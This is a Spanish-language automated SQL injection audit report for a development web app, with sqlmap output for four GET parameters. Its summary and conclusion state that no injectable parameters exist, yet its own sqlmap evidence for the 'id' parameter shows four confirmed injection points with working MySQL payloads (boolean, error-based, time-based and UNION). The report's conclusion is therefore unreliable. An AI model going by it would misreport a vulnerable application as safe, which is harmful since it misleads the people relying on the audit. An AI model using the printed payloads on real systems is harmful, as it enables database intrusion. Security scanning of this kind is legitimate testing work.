# Informe de Auditoría DAST - SQL Injection
Fecha: 2026-04-13T10:22:55
Objetivo: http://web.dev.local:8083

## Resumen Ejecutivo
No se han identificado vulnerabilidades de SQL Injection en los vectores analizados.

## Vectores Analizados
 - http://web.dev.local:8083/?id=1
 - http://web.dev.local:8083/?page=1
 - http://web.dev.local:8083/?q=test
 - http://web.dev.local:8083/?search=test

## Hallazgos
No se detectaron parámetros inyectables.

## Evidencia: Salida de sqlmap (recortes)
```
=== SCANNING: http://web.dev.local:8083/?id=1 ===
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:22:56 /2026-04-13/

)07[?47h[1;24r[m[4l[24;1H[2J[?47l8[?1l>[10:22:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[1/1] URL:
GET http://web.dev.local:8083/?id=1
do you want to test this URL? [Y/n/q]
> Y
[10:22:56] [INFO] testing URL 'http://web.dev.local:8083/?id=1'
[10:22:56] [INFO] resuming back-end DBMS 'mysql' 
[10:22:56] [INFO] using '/root/.local/share/sqlmap/output/results-04132026_1022am.csv' as the CSV results file in multiple targets mode
[10:22:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=2352' OR NOT 7247=7247#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=2352' AND EXTRACTVALUE(4611,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4611=4611,1))),0x7171767871))-- EpGx&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2352' AND (SELECT 8276 FROM (SELECT(SLEEP(5)))fFmn)-- zOtb&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=2352' UNION ALL SELECT CONCAT(0x7176627171,0x72427059744f476b4d78544e587a484175417453704154766b554d6c5077574f6c754a7245786d58,0x7171767871),NULL#&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[10:22:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.65, PHP 8.1.33
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[10:22:56] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04132026_1022am.csv'

[*] ending @ 10:22:56 /2026-04-13/

=== SCANNING: http://web.dev.local:8083/?page=1 ===
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:22:56 /2026-04-13/

)07[?47h[1;24r[m[4l[24;1H[2J[?47l8[?1l>[10:22:56] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[1/1] URL:
GET http://web.dev.local:8083/?page=1
do you want to test this URL? [Y/n/q]
> Y
[10:22:56] [INFO] testing URL 'http://web.dev.local:8083/?page=1'
[10:22:56] [INFO] resuming back-end DBMS 'mysql' 
[10:22:56] [INFO] using '/root/.local/share/sqlmap/output/results-04132026_1022am.csv' as the CSV results file in multiple targets mode
[10:22:56] [INFO] testing connection to the target URL
[10:22:56] [INFO] testing if the target URL content is stable
[10:22:57] [INFO] target URL content is stable
[10:22:57] [INFO] testing if GET parameter 'page' is dynamic
[10:22:57] [WARNING] GET parameter 'page' does not appear to be dynamic
[10:22:57] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
[10:22:57] [INFO] testing for SQL injection on GET parameter 'page'
[10:22:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:22:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:22:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:22:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:22:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[10:22:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[10:22:57] [INFO] testing 'Generic inline queries'
[10:22:57] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:22:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:22:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:22:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:22:57] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:22:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:22:57] [INFO] testing 'MySQL inline queries'
[10:22:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:22:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:22:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:22:57] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[10:22:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:22:57] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:22:57] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:22:57] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[10:22:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[10:22:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:22:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:22:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:22:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[10:22:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[10:22:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:22:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[10:22:57] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:22:57] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[10:22:58] [INFO] testing 'PostgreSQL inline queries'
[10:22:58] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:22:58] [INFO] testing 'Oracle inline queries'
[10:22:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:22:58] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:22:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:22:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[10:22:58] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:22:58] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[10:22:58] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:22:58] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:22:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:22:58] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[10:22:58] [INFO] testing 'Oracle AND time-based blind'
[10:22:58] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[10:22:58] [INFO] testing 'Informix AND time-based blind (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:22:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:22:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:22:58] [WARNING] GET parameter 'page' does not seem to be injectable
[10:22:58] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
[10:22:58] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04132026_1022am.csv'

[*] ending @ 10:22:58 /2026-04-13/

=== SCANNING: http://web.dev.local:8083/?q=test ===
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:22:58 /2026-04-13/

)07[?47h[1;24r[m[4l[24;1H[2J[?47l8[?1l>[10:22:58] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[1/1] URL:
GET http://web.dev.local:8083/?q=test
do you want to test this URL? [Y/n/q]
> Y
[10:22:58] [INFO] testing URL 'http://web.dev.local:8083/?q=test'
[10:22:58] [INFO] resuming back-end DBMS 'mysql' 
[10:22:58] [INFO] using '/root/.local/share/sqlmap/output/results-04132026_1022am.csv' as the CSV results file in multiple targets mode
[10:22:58] [INFO] testing connection to the target URL
[10:22:58] [INFO] testing if the target URL content is stable
[10:22:59] [INFO] target URL content is stable
[10:22:59] [INFO] testing if GET parameter 'q' is dynamic
[10:22:59] [WARNING] GET parameter 'q' does not appear to be dynamic
[10:22:59] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
[10:22:59] [INFO] testing for SQL injection on GET parameter 'q'
[10:22:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:22:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:22:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:22:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:22:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[10:22:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[10:22:59] [INFO] testing 'Generic inline queries'
[10:22:59] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:22:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:22:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:22:59] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:22:59] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:22:59] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:22:59] [INFO] testing 'MySQL inline queries'
[10:22:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:22:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:22:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:22:59] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[10:22:59] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:22:59] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:22:59] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:22:59] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[10:22:59] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[10:22:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:22:59] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[10:22:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:22:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[10:22:59] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[10:22:59] [INFO] testing 'PostgreSQL inline queries'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:22:59] [INFO] testing 'Oracle inline queries'
[10:22:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:22:59] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:22:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[10:22:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:22:59] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[10:22:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:23:00] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:23:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:23:00] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[10:23:00] [INFO] testing 'Oracle AND time-based blind'
[10:23:00] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[10:23:00] [INFO] testing 'Informix AND time-based blind (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:23:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:23:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:23:00] [WARNING] GET parameter 'q' does not seem to be injectable
[10:23:00] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
[10:23:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04132026_1022am.csv'

[*] ending @ 10:23:00 /2026-04-13/

=== SCANNING: http://web.dev.local:8083/?search=test ===
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:23:00 /2026-04-13/

)07[?47h[1;24r[m[4l[24;1H[2J[?47l8[?1l>[10:23:00] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[1/1] URL:
GET http://web.dev.local:8083/?search=test
do you want to test this URL? [Y/n/q]
> Y
[10:23:00] [INFO] testing URL 'http://web.dev.local:8083/?search=test'
[10:23:00] [INFO] resuming back-end DBMS 'mysql' 
[10:23:00] [INFO] using '/root/.local/share/sqlmap/output/results-04132026_1023am.csv' as the CSV results file in multiple targets mode
[10:23:00] [INFO] testing connection to the target URL
[10:23:00] [INFO] testing if the target URL content is stable
[10:23:01] [INFO] target URL content is stable
[10:23:01] [INFO] testing if GET parameter 'search' is dynamic
[10:23:01] [WARNING] GET parameter 'search' does not appear to be dynamic
[10:23:01] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[10:23:01] [INFO] testing for SQL injection on GET parameter 'search'
[10:23:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:23:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:23:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:23:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:23:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[10:23:01] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[10:23:01] [INFO] testing 'Generic inline queries'
[10:23:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:23:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:23:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:23:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:23:01] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:23:01] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:23:01] [INFO] testing 'MySQL inline queries'
[10:23:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:23:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:23:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:23:01] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[10:23:01] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:23:01] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:23:01] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:23:01] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[10:23:01] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[10:23:01] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:23:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[10:23:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:23:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[10:23:02] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[10:23:02] [INFO] testing 'PostgreSQL inline queries'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:23:02] [INFO] testing 'Oracle inline queries'
[10:23:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:23:02] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[10:23:02] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:23:02] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[10:23:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:23:02] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:23:02] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[10:23:02] [INFO] testing 'Oracle AND time-based blind'
[10:23:02] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[10:23:02] [INFO] testing 'Informix AND time-based blind (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[10:23:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:23:02] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:23:02] [WARNING] GET parameter 'search' does not seem to be injectable
[10:23:02] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
[10:23:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04132026_1023am.csv'

[*] ending @ 10:23:02 /2026-04-13/

```

## Conclusión
No se requiere acción inmediata relacionada con SQLi para los vectores analizados.
